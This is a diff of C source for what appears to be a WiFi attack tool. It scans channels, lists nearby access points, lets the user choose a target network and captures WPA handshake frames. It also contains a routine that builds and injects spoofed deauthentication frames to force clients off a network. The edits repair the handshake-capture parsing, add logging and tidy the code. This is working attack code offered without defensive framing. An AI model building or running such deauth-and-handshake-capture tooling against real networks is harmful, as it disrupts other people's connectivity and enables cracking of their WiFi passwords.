@@ -12,7 +12,6 @@
 #include <linux/if_ether.h>
 #include <time.h>
 
-// Default channel list (1-14)
 static int default_channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
 static int num_default_channels = 14;
 
@@ -26,7 +25,6 @@ void scanner_init(struct scanner_state *state, struct capture_handle *cap,
     state->target_found = 0;
 }
 
-// Packet callback function
 void scanner_packet_callback(const uint8_t *packet, int length, void *user_data) {
     struct scanner_state *state = (struct scanner_state *)user_data;
 
@@ -34,24 +32,52 @@ void scanner_packet_callback(const uint8_t *packet, int length, void *user_data)
         return;
     }
 
-    // Parse the packet
     struct parsed_packet pkt = parse_packet(packet, length);
     if (!pkt.valid) {
         return;
     }
 
-    // Check for EAPOL frames (handshake)
     if (pkt.is_eapol) {
+        // Calculate the correct offset to EAPOL data
+        // body_offset = radiotap_len + mac_header_len (pointing to frame body where LLC/SNAP+EAPOL lives)
+        const uint8_t *body_start = packet + pkt.body_offset;
+        int remaining = length - pkt.body_offset;
+        const uint8_t *eapol_start = NULL;
+
+        // Search for LLC/SNAP header with EAPOL ethertype
+        for (int i = 0; i < remaining - 8; i++) {
+            if (body_start[i] == 0xAA && body_start[i+1] == 0xAA &&
+                body_start[i+2] == 0x03 && body_start[i+3] == 0x00 &&
+                body_start[i+4] == 0x00 && body_start[i+5] == 0x00) {
+                uint16_t etype = ntohs(*(uint16_t *)(body_start + i + 6));
+                if (etype == ETHERTYPE_EAPOL) {
+                    eapol_start = body_start + i + 8; // Skip LLC/SNAP (8 bytes)
+                    break;
+                }
+            }
+        }
+
+        if (!eapol_start) {
+            return;
+        }
+
+        int eapol_len = length - (eapol_start - packet);
+        if (eapol_len < 0 || eapol_len > 400) {
+            return;
+        }
+
         int msg_type = handshake_process_eapol(state->handshake,
                                                pkt.src_mac,
                                                pkt.dst_mac,
-                                               packet + length - pkt.raw_len + sizeof(struct radiotap_header),
-                                               pkt.raw_len);
+                                               eapol_start,
+                                               eapol_len);
         if (msg_type > 0) {
-            log_info("Captured WPA Message %d", msg_type);
+            char src_str[18], dst_str[18];
+            mac_to_str(pkt.src_mac, src_str);
+            mac_to_str(pkt.dst_mac, dst_str);
+            log_info("Captured WPA Message %d (from %s to %s)", msg_type, src_str, dst_str);
             handshake_print_status(state->handshake);
 
-            // If we have a target BSSID, check if it matches
             if (state->has_target &&
                 memcmp(pkt.bssid, state->target_bssid, 6) == 0) {
                 state->target_found = 1;
@@ -59,15 +85,11 @@ void scanner_packet_callback(const uint8_t *packet, int length, void *user_data)
         }
     }
 
-    // Check for management frames (beacons, probe responses)
     if (pkt.frame_type == WIFI_FRAME_TYPE_MANAGEMENT) {
         if (pkt.frame_subtype == WIFI_SUBTYPE_BEACON ||
             pkt.frame_subtype == WIFI_SUBTYPE_PROBE_RESP) {
-
-            // Add/update AP in list
             scanner_add_ap(state, &pkt);
 
-            // Update handshake SSID if we don't have it yet
             if (strlen(pkt.ssid) > 0 && strlen(state->handshake->ssid) == 0) {
                 strncpy(state->handshake->ssid, pkt.ssid, sizeof(state->handshake->ssid) - 1);
                 state->handshake->channel = pkt.channel;
@@ -76,26 +98,22 @@ void scanner_packet_callback(const uint8_t *packet, int length, void *user_data)
     }
 }
 
-// Add or update AP in list
 int scanner_add_ap(struct scanner_state *state, const struct parsed_packet *pkt) {
-    // Check if AP already exists
     for (int i = 0; i < state->ap_count; i++) {
         if (memcmp(state->aps[i].bssid, pkt->bssid, 6) == 0) {
-            // Update existing AP
             state->aps[i].beacon_count++;
             state->aps[i].signal_dbm = pkt->signal_dbm;
             state->aps[i].last_seen = time(NULL);
-
-            // Update SSID if we got it
             if (strlen(pkt->ssid) > 0 && strlen(state->aps[i].ssid) == 0) {
                 strncpy(state->aps[i].ssid, pkt->ssid, sizeof(state->aps[i].ssid) - 1);
             }
-
+            if (state->aps[i].channel == 0 && pkt->channel > 0) {
+                state->aps[i].channel = pkt->channel;
+            }
             return 0;
         }
     }
 
-    // Add new AP
     if (state->ap_count < MAX_APS) {
         memcpy(state->aps[state->ap_count].bssid, pkt->bssid, 6);
         strncpy(state->aps[state->ap_count].ssid, pkt->ssid, sizeof(state->aps[0].ssid) - 1);
@@ -104,14 +122,12 @@ int scanner_add_ap(struct scanner_state *state, const struct parsed_packet *pkt)
         state->aps[state->ap_count].beacon_count = 1;
         state->aps[state->ap_count].last_seen = time(NULL);
         state->ap_count++;
-
-        return 1; // New AP added
+        return 1;
     }
 
-    return -1; // AP list full
+    return -1;
 }
 
-// Find AP by BSSID
 struct ap_info* scanner_find_ap(struct scanner_state *state, const uint8_t *bssid) {
     for (int i = 0; i < state->ap_count; i++) {
         if (memcmp(state->aps[i].bssid, bssid, 6) == 0) {
@@ -121,7 +137,6 @@ struct ap_info* scanner_find_ap(struct scanner_state *state, const uint8_t *bssi
     return NULL;
 }
 
-// Print discovered APs
 void scanner_print_aps(struct scanner_state *state) {
     if (state->ap_count == 0) {
         log_warning("No access points found yet");
@@ -131,14 +146,15 @@ void scanner_print_aps(struct scanner_state *state) {
     printf("\n╔════════════════════════════════════════════════════════════════╗\n");
     printf("║                    Discovered Access Points                  ║\n");
     printf("╠════════════════════════════════════════════════════════════════╣\n");
-    printf("║  BSSID              Signal  Ch  SSID                         ║\n");
+    printf("║  #   BSSID              Signal  Ch  SSID                     ║\n");
     printf("╠════════════════════════════════════════════════════════════════╣\n");
 
     for (int i = 0; i < state->ap_count; i++) {
         char bssid_str[18];
         mac_to_str(state->aps[i].bssid, bssid_str);
 
-        printf("║  %-17s  %4d dBm  %2d  %-30s ║\n",
+        printf("║  [%d] %-17s  %4d dBm  %2d  %-28s ║\n",
+               i + 1,
                bssid_str,
                state->aps[i].signal_dbm,
                state->aps[i].channel,
@@ -148,65 +164,11 @@ void scanner_print_aps(struct scanner_state *state) {
     printf("╚════════════════════════════════════════════════════════════════╝\n\n");
 }
 
-// Get channel list
 void scanner_get_channels(int *channels, int *num_channels) {
     memcpy(channels, default_channels, sizeof(default_channels));
     *num_channels = num_default_channels;
 }
 
-// Start scanning
-int scanner_start(struct scanner_state *state, int dwell_time_ms) {
-    int channels[14];
-    int num_channels;
-
-    scanner_get_channels(channels, &num_channels);
-
-    log_info("Starting WiFi scanner...");
-    log_info("Scanning %d channels (dwell time: %d ms)", num_channels, dwell_time_ms);
-    log_info("Press Ctrl+C to stop\n");
-
-    uint8_t buffer[MAX_PACKET_SIZE];
-    int current_channel = 0;
-    time_t start_time = time(NULL);
-
-    while (*(state->running)) {
-        // Set channel
-        if (capture_set_channel(state->cap, channels[current_channel]) < 0) {
-            log_error("Failed to set channel %d", channels[current_channel]);
-            current_channel = (current_channel + 1) % num_channels;
-            continue;
-        }
-
-        // Capture packets on this channel
-        struct timeval start, now;
-        gettimeofday(&start, NULL);
-
-        do {
-            int packet_len = capture_packet(state->cap, buffer, sizeof(buffer), 100);
-            if (packet_len > 0) {
-                scanner_packet_callback(buffer, packet_len, state);
-            }
-            gettimeofday(&now, NULL);
-        } while (((now.tv_sec - start.tv_sec) * 1000 +
-                  (now.tv_usec - start.tv_usec) / 1000) < dwell_time_ms);
-
-        // Move to next channel
-        current_channel = (current_channel + 1) % num_channels;
-
-        // Print status every 10 seconds
-        if (time(NULL) - start_time >= 10) {
-            scanner_print_aps(state);
-            start_time = time(NULL);
-        }
-    }
-
-    // Print final results
-    scanner_print_aps(state);
-
-    return state->ap_count;
-}
-
-// Scan for a fixed duration
 int scanner_scan_duration(struct scanner_state *state, int dwell_time_ms, int duration_sec) {
     int channels[14];
     int num_channels;
@@ -250,7 +212,6 @@ int scanner_scan_duration(struct scanner_state *state, int dwell_time_ms, int du
     return state->ap_count;
 }
 
-// Interactive target selection
 int scanner_select_target(struct scanner_state *state) {
     if (state->ap_count == 0) {
         log_warning("No networks found. Try scanning again.");
@@ -295,7 +256,6 @@ int scanner_select_target(struct scanner_state *state) {
 
     int idx = choice - 1;
 
-    // Set target
     memcpy(state->target_bssid, state->aps[idx].bssid, 6);
     state->has_target = 1;
 
@@ -309,19 +269,16 @@ int scanner_select_target(struct scanner_state *state) {
     return idx;
 }
 
-// Build and send a deauthentication frame
 int scanner_send_deauth(struct capture_handle *cap,
                         const uint8_t *target_bssid,
                         const uint8_t *client_mac,
                         int count) {
-    // Create a separate socket for injection
     int inject_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if (inject_fd < 0) {
         log_error("Failed to create injection socket");
         return -1;
     }
 
-    // Get interface index
     struct ifreq ifr;
     memset(&ifr, 0, sizeof(ifr));
     strncpy(ifr.ifr_name, cap->iface, IFNAMSIZ - 1);
@@ -332,7 +289,6 @@ int scanner_send_deauth(struct capture_handle *cap,
     }
     int ifindex = ifr.ifr_ifindex;
 
-    // Set up address for sending
     struct sockaddr_ll addr;
     memset(&addr, 0, sizeof(addr));
     addr.sll_family = AF_PACKET;
@@ -340,36 +296,25 @@ int scanner_send_deauth(struct capture_handle *cap,
     addr.sll_halen = 6;
     memcpy(addr.sll_addr, target_bssid, 6);
 
-    // Deauth frame
     uint8_t deauth_frame[26];
     memset(deauth_frame, 0, sizeof(deauth_frame));
 
-    // Frame Control: Deauthentication (0xC0 0x00 = little-endian for 0x00C0)
     deauth_frame[0] = 0xC0;
     deauth_frame[1] = 0x00;
-
-    // Duration
     deauth_frame[2] = 0x00;
     deauth_frame[3] = 0x00;
 
-    // Address 1: Client or broadcast
     if (client_mac) {
         memcpy(deauth_frame + 4, client_mac, 6);
     } else {
-        memset(deauth_frame + 4, 0xFF, 6); // Broadcast
+        memset(deauth_frame + 4, 0xFF, 6);
     }
 
-    // Address 2: AP MAC (source)
     memcpy(deauth_frame + 10, target_bssid, 6);
-
-    // Address 3: AP MAC (BSSID)
     memcpy(deauth_frame + 16, target_bssid, 6);
 
-    // Sequence Control
     deauth_frame[22] = 0x00;
     deauth_frame[23] = 0x00;
-
-    // Reason Code: 7 (Class 3 frame from non-associated station)
     deauth_frame[24] = 0x07;
     deauth_frame[25] = 0x00;
 
@@ -380,8 +325,7 @@ int scanner_send_deauth(struct capture_handle *cap,
         if (ret > 0) {
             sent++;
         }
-
-        usleep(10000); // 10ms between packets
+        usleep(10000);
     }
 
     close(inject_fd);
